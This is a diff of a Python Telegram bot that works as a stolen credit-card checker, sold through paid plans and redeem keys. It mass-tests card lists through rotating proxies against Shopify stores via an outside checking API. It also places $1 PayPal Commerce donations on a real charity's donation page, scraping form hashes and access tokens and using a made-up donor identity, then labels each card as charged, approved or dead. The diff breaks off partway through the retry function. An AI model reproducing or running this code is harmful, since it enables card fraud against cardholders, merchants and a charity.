@@ -1,5 +1,5 @@
 # ==============================================================================
-# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 & 𝗣𝗔𝗬𝗣𝗔𝗟 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗛𝗬𝗕𝗥𝗜𝗗 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘𝗠
+# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -85,13 +85,14 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# روابط الـ APIs والمخازن
+# رابط الـ API الجديد
 SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
+# التعديلات المطلوبة
 WORKERS = 40  
-DELAY = 2.0  
+DELAY = 5.0  
 HIT_DELAY = 1.0
 API_TIMEOUT = 60
 
@@ -188,6 +189,15 @@ CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
 
 # ====================== BULLETPROOF CONFIGS ======================
+def get_flag_emoji(country_code, fallback="🏳️"):
+    if not country_code or len(country_code) != 2: return fallback
+    c = country_code.upper()
+    if c in ["-", "UNKNOWN", ""]: return fallback
+    try:
+        return chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397)
+    except Exception:
+        return fallback
+
 WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
 REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"
 
@@ -220,6 +230,9 @@ def get_system_lock(name: str):
     if name not in _system_locks: _system_locks[name] = asyncio.Lock()
     return _system_locks[name]
 
+async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    logger.error(f"Exception in update: {context.error}")
+
 def is_valid_url(link):
     return link and str(link).strip().startswith("http")
 
@@ -248,7 +261,8 @@ async def send_forced_gif(target_func, text, markup, url):
             return msg
         except RetryAfter as e:
             await asyncio.sleep(e.retry_after + 0.5)
-        except Exception: break
+        except Exception:
+            break
             
     try:
         gif_io = await fetch_gif_bytes(url)
@@ -264,7 +278,8 @@ async def send_forced_gif(target_func, text, markup, url):
                     return msg
                 except RetryAfter as e:
                     await asyncio.sleep(e.retry_after + 0.5)
-                except Exception: break
+                except Exception:
+                    break
     except Exception: pass
 
     try:
@@ -294,7 +309,8 @@ async def styled_edit(msg, text, buttons=None):
             return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
         except RetryAfter as e:
             await asyncio.sleep(e.retry_after + 0.5)
-        except Exception: return None
+        except Exception: 
+            return None
 
 async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
@@ -366,10 +382,18 @@ def extract_cc(text):
 # ====================== PROXY PARSER (EXCLUDES SOCKS) ======================
 def parse_proxy_format(proxy):
     proxy = proxy.strip()
-    if re.match(r'^socks', proxy, re.IGNORECASE): return None
+    
+    # استبعاد أي بروكسي يبدأ صراحة بكلمة socks (socks4, socks5) لمنع إضافته
+    if re.match(r'^socks', proxy, re.IGNORECASE):
+        return None
+        
     pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
     pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
-    if 'socks' in pt: return None
+    
+    # فحص بروتوكول البروكسي للتأكد مجدداً من خلوه من أي سوكس
+    if 'socks' in pt:
+        return None
+        
     if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
     elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
     elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
@@ -384,13 +408,17 @@ _LAST_SITES_FETCH = 0
 async def get_shopify_sites():
     global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     now = time.time()
-    if _CACHED_SHOPIFY_SITES: return _CACHED_SHOPIFY_SITES
+    if _CACHED_SHOPIFY_SITES: 
+        return _CACHED_SHOPIFY_SITES
+        
     if os.path.exists('sites.txt'):
         try:
             async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                 _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
-                if _CACHED_SHOPIFY_SITES: return _CACHED_SHOPIFY_SITES
+                if _CACHED_SHOPIFY_SITES:
+                    return _CACHED_SHOPIFY_SITES
         except Exception: pass
+        
     try:
         async with aiohttp.ClientSession() as s:
             async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
@@ -398,6 +426,7 @@ async def get_shopify_sites():
                     _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                     _LAST_SITES_FETCH = now
     except Exception: pass
+    
     return _CACHED_SHOPIFY_SITES
 
 def is_dead_site_error(err):
@@ -423,10 +452,73 @@ async def is_user_joined(uid, bot):
         except Exception: pass 
     return True
 
+async def send_welcome_menu(update_or_bot, uid, plan, limit):
+    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
+    
+    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
+
+<b>{CE_TOP} {sf('Checker Engine')}:</b>
+ ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>
+
+<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
+ ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
+ ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
+ ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}
+ ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}
+
+<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
+ ├ {CE_CANDLE} /info - {sf('Profile Info')}
+ ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
+ ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
+ ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}
+
+<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
+    
+    kb = [
+        [InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"),
+         InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]
+    ]
+    
+    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
+        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162"), InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
+    elif is_valid_url(JOIN_CHANNEL_LINK):
+        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
+    elif is_valid_url(JOIN_GROUP_LINK):
+        kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
+        
+    if isinstance(update_or_bot, Update):
+        await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
+    else:
+        await styled_send(update_or_bot, uid, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
+
+async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if uid in ADMIN_ID: return True
+    now = time.time()
+    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
+    
+    is_joined = await is_user_joined(uid, context.bot)
+    if is_joined:
+        _JOIN_CACHE[uid] = now
+        return True
+        
+    kb = []
+    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
+    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
+    if kb: kb.append([InlineKeyboardButton('Verify', callback_data="check_joined", style="success", icon_custom_emoji_id="5445189224682779974")])
+    
+    await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
+    return False
+
 async def get_bin_info(bin_code, session=None):
     b6 = str(bin_code)[:6]
-    if b6 in _BIN_CACHE: return _BIN_CACHE[b6]
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"}
+    if b6 in _BIN_CACHE: 
+        return _BIN_CACHE[b6]
+        
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+    }
+    
     try:
         url1 = f"https://bins.antipublic.cc/bins/{b6}"
         async def fetch1(s):
@@ -435,86 +527,123 @@ async def get_bin_info(bin_code, session=None):
                     data = await r.json()
                     if data and isinstance(data, dict) and data.get('brand'): return data
                 return None
+        
         res = await fetch1(session) if (session and not session.closed) else await fetch1(aiohttp.ClientSession())
         if res:
             parsed = {
-                "brand": str(res.get("brand", "-")).upper(), "type": str(res.get("type", "-")).upper(),
-                "level": str(res.get("level", "-")).upper(), "bank": str(res.get("bank", "-")).upper(),
-                "country": str(res.get("country", "-")).upper(), "country_code": str(res.get("country_code", "")).upper().strip(),
+                "brand": str(res.get("brand", "-")).upper(),
+                "type": str(res.get("type", "-")).upper(),
+                "level": str(res.get("level", "-")).upper(),
+                "bank": str(res.get("bank", "-")).upper(),
+                "country": str(res.get("country", "-")).upper(),
+                "country_code": str(res.get("country_code", "")).upper().strip(),
                 "flag": res.get("flag", "")
             }
-            _BIN_CACHE[b6] = parsed; return parsed
+            _BIN_CACHE[b6] = parsed
+            return parsed
     except Exception: pass
+
     try:
         url2 = f"https://data.handyapi.com/bin/{b6}"
         async def fetch2(s):
             async with s.get(url2, headers=headers, timeout=4) as r:
                 if r.status == 200: return await r.json()
                 return None
+                
         res2 = await fetch2(session) if (session and not session.closed) else await fetch2(aiohttp.ClientSession())
         if res2 and res2.get("Status") == "SUCCESS":
             country_obj = res2.get("Country", {})
             bank_obj = res2.get("Bank", {})
             parsed = {
-                "brand": str(res2.get("Scheme", "-")).upper(), "type": str(res2.get("Type", "-")).upper(),
-                "level": str(res2.get("CardTier", "-")).upper(), "bank": str(bank_obj.get("Name", "-")).upper(),
-                "country": str(country_obj.get("Name", "-")).upper(), "country_code": str(country_obj.get("A2", "")).upper().strip(),
+                "brand": str(res2.get("Scheme", "-")).upper(),
+                "type": str(res2.get("Type", "-")).upper(),
+                "level": str(res2.get("CardTier", "-")).upper(),
+                "bank": str(bank_obj.get("Name", "-")).upper(),
+                "country": str(country_obj.get("Name", "-")).upper(),
+                "country_code": str(country_obj.get("A2", "")).upper().strip(),
                 "flag": ""
             }
-            _BIN_CACHE[b6] = parsed; return parsed
+            _BIN_CACHE[b6] = parsed
+            return parsed
     except Exception: pass
+
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# ====================== GATES ENGINES (SHOPIFY & PAYPAL) ======================
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
-        if proxy_str and "://" in proxy_str: proxy_str = proxy_str.split("://")[-1]
+        if proxy_str and "://" in proxy_str:
+            proxy_str = proxy_str.split("://")[-1]
+        
         card_encoded = quote(str(card).strip())
+        
         site_param = site.strip()
-        if not site_param.startswith("http"): site_param = f"https://{site_param}"
+        if not site_param.startswith("http"):
+            site_param = f"https://{site_param}"
         site_encoded = quote(site_param)
+        
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
         req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
         
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        }
+        
         async with session.get(req_url, headers=headers, timeout=API_TIMEOUT) as resp:
             text_data = await resp.text()
+            
             try: 
                 rj = json.loads(text_data)
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
                 pr = rj.get('Price', rj.get('amount', "$10.00")) 
                 gt = rj.get('Gateway', 'Shopify')
             except Exception: 
-                rm = text_data.strip(); pr = "$10.00"; gt = "Shopify"
+                rm = text_data.strip()
+                pr = "$10.00"
+                gt = "Shopify"
             
             rl = rm.lower()
+            
+            # اقتناص أخطاء شوبفاي وبوابات الدفع ومنعها فوراً من الوصول لشرط الـ Approved
             if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
+            
             if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
+                
             if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
                 return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
+                
             if 'charged' in rl or 'completed' in rl or 'payment succeeded' in rl or 'success' in rl: 
                 return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
+                
             if '3d' in rl or 'secure' in rl or 'otp' in rl:
                 return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
+                
             if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
                 return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+                
             return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
-    except Exception as e: return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}
+        
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
+    except Exception as e: 
+        return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}
 
+# ====================== ASYNC PAYPAL GATEWAY ENGINE ======================
 async def check_paypal_api(card, proxy, session):
     try:
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         card = card.strip()
         parts = card.split("|")
-        if len(parts) < 4: return {'status': 'Dead', 'message': 'Invalid Format', 'card': card, 'gateway': 'PayPal Commerce', 'price': '$1.00'}
+        if len(parts) < 4:
+            return {'status': 'Dead', 'message': 'Invalid Card Format', 'card': card, 'gateway': 'PayPal Commerce', 'price': '$1.00'}
         
         n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
-        if "20" in yy and len(yy) == 4: yy = yy.split("20")[1]
-        elif len(yy) == 4: yy = yy[2:]
+        if "20" in yy and len(yy) == 4:
+            yy = yy.split("20")[1]
+        elif len(yy) == 4:
+            yy = yy[2:]
 
         price = "1.00"
         urll = "https://www.callahandogs.com/donate/"
@@ -522,220 +651,259 @@ async def check_paypal_api(card, proxy, session):
         
         async with session.get(urll, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response:
             resp_text = await response.text()
+            
         try:
             vaa = re.search(r'name="give-form-hash" value="(.*?)"', resp_text).group(1)
             vaa2 = re.search(r'name="give-form-id-prefix" value="(.*?)"', resp_text).group(1)
             vaa3 = re.search(r'name="give-form-id" value="(.*?)"', resp_text).group(1)
             vaa4 = re.search(r'"data-client-token":"(.*?)"', resp_text).group(1)
-            au = re.search(r'"accessToken":"(.*?)"', base64.b64decode(vaa4).decode('utf-8')).group(1)
+            decc = base64.b64decode(vaa4)
+            dec = decc.decode('utf-8')
+            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
         except Exception:
             return {'status': 'Site Error', 'message': 'Token Extraction Failed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
 
         url_create = "https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
         payload = {
-            'give-honeypot': '', 'give-form-id-prefix': vaa2, 'give-form-id': vaa3, 'give-form-title': 'Make a Donation',
-            'give-current-url': urll, 'give-form-url': urll, 'give-form-minimum': price, 'give-form-maximum': '1000000',
-            'give-form-hash': vaa, 'give-price-id': '0', 'give-amount': price, 'payment-mode': 'paypal-commerce',
-            'give_title': 'Mr.', 'give_first': 'Gustave', 'give_last': 'Bruen', 'give_company_option': 'no',
-            'give_company_name': '', 'give_email': f'donate_{random.randint(1000,9999)}@gmail.com', 'give_comment': '',
-            'card_name': 'Tome', 'card_exp_month': '', 'card_exp_year': '', 'billing_country': 'US',
-            'card_address': 'RTS 58/3 Bark Camp', 'card_address_2': '', 'card_city': 'Alkol', 'card_state': 'WV',
-            'card_zip': '25501', 'give-gateway': 'paypal-commerce'
+            'give-honeypot': '',
+            'give-form-id-prefix': vaa2,
+            'give-form-id': vaa3,
+            'give-form-title': 'Make a Donation',
+            'give-current-url': urll,
+            'give-form-url': urll,
+            'give-form-minimum': price,
+            'give-form-maximum': '1000000',
+            'give-form-hash': vaa,
+            'give-price-id': '0',
+            'give-amount': price,
+            'payment-mode': 'paypal-commerce',
+            'give_title': 'Mr.',
+            'give_first': 'Gustave',
+            'give_last': 'Bruen',
+            'give_company_option': 'no',
+            'give_company_name': '',
+            'give_email': f'donate_{random.randint(1000,9999)}@gmail.com',
+            'give_comment': '',
+            'card_name': 'Tome',
+            'card_exp_month': '',
+            'card_exp_year': '',
+            'billing_country': 'US',
+            'card_address': 'RTS 58/3 Bark Camp',
+            'card_address_2': '',
+            'card_city': 'Alkol',
+            'card_state': 'WV',
+            'card_zip': '25501',
+            'give-gateway': 'paypal-commerce'
         }
+        
         async with session.post(url_create, data=payload, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response_create:
             res_create = await response_create.json()
-        try: idd = res_create['data']['id']
-        except Exception: return {'status': 'Site Error', 'message': 'Order Token Failed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
+            
+        try:
+            idd = res_create['data']['id']
+        except Exception:
+            return {'status': 'Site Error', 'message': 'Order Token Failed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
 
         url_confirm = f"https://cors.api.paypal.com/v2/checkout/orders/{idd}/confirm-payment-source"
         payload_confirm = {
-            "payment_source": {"card": {"number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc, "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}}},
-            "application_context": {"vault": False}
+            "payment_source": {
+                "card": {
+                    "number": n,
+                    "expiry": f"20{yy}-{mm}",
+                    "security_code": cvc,
+                    "attributes": {
+                        "verification": {
+                            "method": "SCA_WHEN_REQUIRED"
+                        }
+                    }
+                }
+            },
+            "application_context": {
+                "vault": False
+            }
         }
         headers_paypal = {
-            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-            'Content-Type': "application/json", 'authorization': f"Bearer {au}", 'braintree-sdk-version': "3.32.0-payments-sdk-dev",
-            'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6", 'origin': "https://assets.braintreegateway.com", 'referer': "https://assets.braintreegateway.com/",
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
+            'Accept-Encoding': "gzip, deflate, br, zstd",
+            'Content-Type': "application/json",
+            'authorization': f"Bearer {au}",
+            'braintree-sdk-version': "3.32.0-payments-sdk-dev",
+            'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6",
+            'origin': "https://assets.braintreegateway.com",
+            'referer': "https://assets.braintreegateway.com/",
+            'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
         }
+        
         async with session.post(url_confirm, json=payload_confirm, headers=headers_paypal, proxy=proxy_url, timeout=API_TIMEOUT) as response_confirm:
             await response_confirm.read()
 
         url_approve = f"https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
         async with session.post(url_approve, data=payload, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response_approve:
-            resp_text = await response_approve.text()
+            res_approve = await response_approve.json()
 
-        try:
-            try:
-                res_json = json.loads(resp_text)
-                if res_json.get("success"): return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-                text = str(res_json)
-            except Exception: text = resp_text
+        if res_approve.get("success"):
+            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
 
-            status_err = ""
-            if "'data': {'error': ' " in text: status_err = text.split("'data': {'error': ' ")[1].split('.')[0]
-            elif "'details': [{'issue': '" in text: status_err = text.split("'details': [{'issue': '")[1].split("'")[0]
-            elif "issuer is not certified. " in text: status_err = text.split("issuer is not certified. ")[1].split('.')[0]
-            elif "system is unavailable.  " in text: status_err = text.split("system is unavailable. ")[1].split('.')[0]
-            elif "C does not match. " in text: status_err = text.split("not match. ")[1].split('.')[0]
-            elif "service is not supported. " in text: status_err = text.split("service is not supported. ")[1].split('.')[0]
-            elif "'data': {'error': '" in text: status_err = text.split("'data': {'error': '")[1].split('.')[0]
-            elif "error" in text.lower():
-                try: status_err = re.search(r'error["\']?\s*:\s*["\']?([^"\'\.]*)', text, re.IGNORECASE).group(1)
-                except Exception: status_err = "Transaction Error"
-            else: status_err = text[:100]
-                
-            sta = status_err.replace(' ', '').replace('_', ' ').title().strip()
-            sta_lower = sta.lower()
+        text = str(res_approve)
+        status_err = ""
+        if "'data': {'error': ' " in text:
+            status_err = text.split("'data': {'error': ' ")[1].split('.')[0]
+        elif "'details': [{'issue': '" in text:
+            status_err = text.split("'details': [{'issue': '")[1].split("'")[0]
+        elif "issuer is not certified. " in text:
+            status_err = text.split("issuer is not certified. ")[1].split('.')[0]
+        elif "system is unavailable.  " in text:
+            status_err = text.split("system is unavailable. ")[1].split('.')[0]
+        elif "C does not match. " in text:
+            status_err = text.split("not match. ")[1].split('.')[0]
+        elif "service is not supported. " in text:
+            status_err = text.split("service is not supported. ")[1].split('.')[0]
+        elif "'data': {'error': '" in text:
+            status_err = text.split("'data': {'error': '")[1].split('.')[0]
+        else:
+            status_err = text[:100]
+            
+        sta = status_err.replace(' ', '').replace('_', ' ').title().strip()
+        sta_lower = sta.lower()
 
-            if any(k in sta_lower for k in ['insufficient', 'funds', 'balance']): return {'status': 'Insufficient', 'message': sta, 'card': card, 'gateway': 'PayPal', 'price': price}
-            if any(k in sta_lower for k in ['cvv', 'security code', 'not match', 'does not match', 'incorrect_cvv']): return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal', 'price': price}
-            if any(k in sta_lower for k in ['3d', 'secure', 'three d', 'otp', 'verification', 'sca']): return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'PayPal', 'price': price}
-            if any(k in sta_lower for k in ['declined', 'refused', 'stolen', 'lost', 'restricted', 'do not honor', 'expired', 'invalid number', 'suspected fraud', 'blocked']): return {'status': 'Dead', 'message': sta, 'card': card, 'gateway': 'PayPal', 'price': price}
-            if any(k in sta_lower for k in ['system unavailable', 'error', 'timeout', 'gateway error']): return {'status': 'Site Error', 'message': sta, 'card': card, 'gateway': 'PayPal', 'price': price, 'retry': True}
-            return {'status': 'Dead', 'message': sta if sta else 'Transaction Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-        except Exception: return {'status': 'Dead', 'message': 'Response Parse Error', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-    except Exception as e: return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'gateway': 'PayPal Commerce', 'price': '1.00', 'retry': True}
+        if any(k in sta_lower for k in ['insufficient', 'funds', 'balance']):
+            return {'status': 'Insufficient', 'message': sta, 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+        
+        if any(k in sta_lower for k in ['cvv', 'security code', 'not match', 'does not match', 'c does not match']):
+            return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+
+        if any(k in sta_lower for k in ['3d', 'secure', 'three d', 'otp', 'verification']):
+            return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+
+        if any(k in sta_lower for k in ['declined', 'refused', 'stolen', 'lost', 'restricted', 'do not honor', 'expired', 'invalid number', 'suspected fraud']):
+            return {'status': 'Dead', 'message': sta, 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+
+        if any(k in sta_lower for k in ['system unavailable', 'error', 'timeout', 'gateway error', 'issue']):
+            return {'status': 'Site Error', 'message': sta, 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
+
+        return {'status': 'Dead', 'message': sta if sta else 'Transaction Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'PayPal API Timeout', 'card': card, 'gateway': 'PayPal Commerce', 'price': '1.00', 'retry': True}
+    except Exception as e:
+        return {'status': 'Site Error', 'message': f'PayPal API Error: {str(e)[:40]}', 'card': card, 'gateway': 'PayPal Commerce', 'price': '1.00', 'retry': True}
+
+async def remove_proxy_by_url(uid, proxy_url):
+    try:
+        current_proxies = await get_all_user_proxies(uid)
+        if current_proxies:
+            for idx, p in enumerate(current_proxies):
+                if p.get('proxy_url') == proxy_url:
+                    await remove_proxy_by_index(uid, idx)
+                    break
+    except Exception: pass
 
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=6):
-    lr = None; tried_sites = set()
+    lr = None
+    tried_sites = set() # لضمان عدم تكرار فحص نفس البوابة للبطاقة الواحدة عند الفشل
+    
     for attempt in range(max_retries):
-        if not proxies: p = None
+        if not proxies: 
+            p = None
         else:
-            p_dict = random.choice(proxies); p = p_dict['proxy_url']
+            p_dict = random.choice(proxies)
+            p = p_dict['proxy_url']
+        
+        # تصفية المواقع النشطة والتي لم يتم تجربتها لهذه البطاقة في هذه المحاولة
+        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS and s not in tried_sites]
+        if not acs: 
+            # إذا تم تجربة كل المواقع، نتيح فرصة المحاولة مرة أخرى مع تجنب المواقع المجربة بالفعل في نفس الملف
+            acs = [s for s in sites if s not in tried_sites]
+        if not acs:
+            acs = sites
+            
+        s = random.choice(acs) if acs else "touch-of-finland.myshopify.com"
+        tried_sites.add(s) # تسجيل الموقع الحالي لمنع التكرار
         
         if gateway_name == "Shopify":
-            acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS and s not in tried_sites]
-            if not acs: acs = [s for s in sites if s not in tried_sites]
-            if not acs: acs = sites
-            s = random.choice(acs) if acs else "touch-of-finland.myshopify.com"; tried_sites.add(s)
-            
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
